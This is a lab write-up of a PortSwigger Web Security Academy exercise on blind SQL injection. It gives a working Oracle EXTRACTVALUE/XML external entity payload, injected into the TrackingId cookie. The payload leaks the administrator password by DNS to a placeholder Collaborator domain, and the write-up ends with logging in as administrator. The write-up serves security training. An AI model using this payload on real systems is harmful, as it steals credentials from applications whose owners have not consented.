# SQL Injection - Blind SQLi with out-of-band data exfiltration

## 📌 Lab Details
- **Title**: Blind SQL injection with out-of-band data exfiltration
- **Difficulty**: Practitioner
- **Category**: SQL Injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/365ed5e4a7dbea87f7a659dd1349317f193bd4449f6ab6ed8062e5a319f553c6?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-out-of-band-data-exfiltration

## 🔍 Summary
This lab shows how to exploit **blind SQL injection with out-of-band DNS exfiltration** to extract the administrator’s password from the database by forcing the server to leak it via a DNS request to your Burp Collaborator.

## 🛠 Steps to Solve
1. Use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
2. Modify the `TrackingId` cookie and inject the payload: `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'YOUR-COLLABORATOR-DOMAIN">+%25remote%3b]>'),'/l')+FROM+dual--`.
3. Go to the **Collaborator** tab and click "Poll Now".
4. The password of the `administrator` user should appear in the subdomain of the interaction, and you can view this within the Collaborator tab.
5. Log in as the `administrator` and complete the lab.

## 📖 Key Takeaways
- Blind SQLi can be used to **exfiltrate sensitive data via DNS OOB**, even when no response changes are visible.
- Using **Oracle’s** `EXTRACTVALUE` **with XML external entities** can leak database values in DNS requests.
- Burp Collaborator captures the DNS requests, revealing the extracted administrator password for login.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/e6991839-06b7-4df7-9ae3-bb77d5181a25)
![image](https://github.com/user-attachments/assets/606e51c8-66ba-4dd6-8888-3023345c90ce)
![image](https://github.com/user-attachments/assets/e358bf4a-7a9d-44ae-bd3f-cddda69e834f)
![image](https://github.com/user-attachments/assets/61e6c930-d9aa-468e-8ee4-03f3fc24e41d)
